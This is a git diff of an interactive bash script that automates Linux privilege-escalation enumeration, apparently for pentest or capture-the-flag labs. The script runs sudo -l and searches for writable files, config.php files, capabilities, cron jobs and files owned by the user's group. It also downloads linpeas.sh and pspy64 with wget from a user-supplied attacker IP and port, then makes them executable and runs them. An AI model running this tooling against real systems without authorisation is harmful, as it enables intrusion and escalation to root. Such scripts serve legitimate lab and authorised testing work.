@@ -47,28 +47,43 @@ nounderline=`tput rmul`
 
 read -p 'Please enter your ip: ' my_ip
 
+read -p 'Please enter your server`s port: ' my_port
+
 echo -e "${PURPLE}${bold}Let's try looking for priv esc:\n\n"
 
 echo -e "${RED}Looking for my id:${NC}\n\n"
 id
 
 echo -e "\n${RED}sudo -l:${NC}\n\n"
-read -p "Do you have the password y/n?" answer
+read -p "Do you have the password? y/n " answer
 if [ "$answer" != "${answer#[Yy]}" ] ;then # this grammar (the #[] operator) means that the variable $answer where any Y or y in 1st position will be dropped if they exist.
     sudo -l
 else
     echo "I see, let's move on..."
 fi
 
-
 echo -e "\n${RED} Looking inside important files:${NC}\n\n"
+
+read -p "Do you want to see all writable files for the current user? y/n " answer
+if [ "$answer" != "${answer#[Yy]}" ] ;then
+    find /etc -writable 2>/dev/null
+else
+    echo "I see, let's move on..."
+fi
+
+read -p "Do you want to see what is accessable inside your group? y/n " answer
+if [ "$answer" != "${answer#[Yy]}" ] ;then
+    find / -group $gid 2> /dev/null
+else
+    echo "I see, let's move on..."
+fi
 
 echo -e "${BLUE}ls -la /var/backups:${NC}"
 ls -la /var/backups
 
 echo -e "${BLUE}ls -aR /home:${NC}"
 ls -la /home
-read -p "After looking at the home directory, do you want to look into folders inside it? y/n" answer
+read -p "After looking at the home directory, do you want to look into folders inside it? y/n " answer
 if [ "$answer" != "${answer#[Yy]}" ] ;then
     read -r -p "Please enter folder's names separated by space: " -a arr
 	for folder in "${arr[@]}"; do 
@@ -88,7 +103,7 @@ else
 fi
 
 
-read -p "Do you want to look for the configurations? y/n?" answer
+read -p "Do you want to look for the configurations? y/n " answer
 if [ "$answer" != "${answer#[Yy]}" ] ;then
     echo -e "\n${BLUE}Looking for configuration files:${normal}"
 	find / -type f -iname 'config.php*' 2>/dev/null
@@ -97,7 +112,7 @@ else
     echo "No configurations looking this time? let's move on..."
 fi
 
-read -p "Do you want to search for extensions like .sh, .php, .py etc? y/n" answer
+read -p "Do you want to search for extensions like .sh, .php, .py etc? y/n " answer
 if [ "$answer" != "${answer#[Yy]}" ] ;then
     read -r -p "Enter their names (without the dot) with spaces between: " -a arr
 	for ext in "${arr[@]}"; do 
@@ -119,6 +134,14 @@ getcap -r / 2>/dev/null
 
 echo -e "${BLUE} crontab:${NC}"
 cat /etc/crontab
+
+read -p "Want to look into more directories of cron tasks? y/n " answer
+if [ "$answer" != "${answer#[Yy]}" ] ;then
+    ls -l /var/spool/cron
+    echo -e "You can also try to use: systemctl list-timers"
+else
+    echo "I see, let's move on..."
+fi
 
 echo -e "${BLUE} Docker maybe:${NC}"
 netstat -tplan
@@ -142,47 +165,51 @@ echo -e "\n${RED} Looking for files owned by user or group:${NC}\n\n"
 echo -e "${BLUE}Your uid and gid are:${NC}\n\n"
 id
 
-read -p "Please enter your uid gid " uid gid
-echo -e "\n${BLUE} Your $uid owns: ${NC}"
-find / -user $uid 2> /dev/null
+uid=$(id -u)
+gid=$(id -g)
 
-echo -e "\n${BLUE} Your $gid owns: ${NC}"
-find / -group $gid 2> /dev/null
-
-echo -e "\n${RED} Looking for git stuff:${NC}\n\n"
-ls -la /
-
-read -p "Do you see any .git file here? y/n?" answer
+read -p "Do you want to see what your user owns? y/n " answer
 if [ "$answer" != "${answer#[Yy]}" ] ;then
-    cd /
-    git log -p
+    echo -e "\n${BLUE} Your $uid owns: ${NC}"
+	find / -user $uid 2> /dev/null
 else
-    echo "No .git ha? let's move on..."
+    echo "Not interested with what you owns? let's move on..."
 fi
 
+read -p "Do you want to see what your group owns? y/n " answer
+if [ "$answer" != "${answer#[Yy]}" ] ;then
+    echo -e "\n${BLUE} Your $gid owns: ${NC}"
+	find / -group $gid 2> /dev/null
+else
+    echo "Not interested with what your group owns? let's move on..."
+fi
 
+echo -e "\n${RED} Looking for git stuff:${NC}\n\n"
+
+cd /
+git log -p
 
 echo -e "\n${RED} linpeas.sh\npspy64${NC}\n\n"
 cd /tmp
 if ! test -f "linpeas.sh"; then
 	echo "You haven't downloaded linpeas.sh ! I will do it for you :)"
-    wget $my_ip:8000/linpeas.sh
+    wget $my_ip:$my_port/linpeas.sh
 	chmod +x linpeas.sh
 fi
 if ! test -f "pspy64"; then
 	echo "You haven't downloaded pspy64 ! I will do it for you :)"
-    wget $my_ip:8000/pspy64
+    wget $my_ip:$my_port/pspy64
 	chmod +x pspy64
 fi
 
-read -p "Do you want to run linpeas.sh | tee linpes.log? y/n?" answer
+read -p "Do you want to run linpeas.sh | tee linpeas.log? y/n " answer
 if [ "$answer" != "${answer#[Yy]}" ] ;then
     ./linpeas.sh | tee linpeas.log
 else
     echo "No linpeas.sh this time..."
 fi
 
-read -p "Do you want to run pspy64? y/n?" answer
+read -p "Do you want to run pspy64? y/n " answer
 if [ "$answer" != "${answer#[Yy]}" ] ;then
     ./pspy64
 else
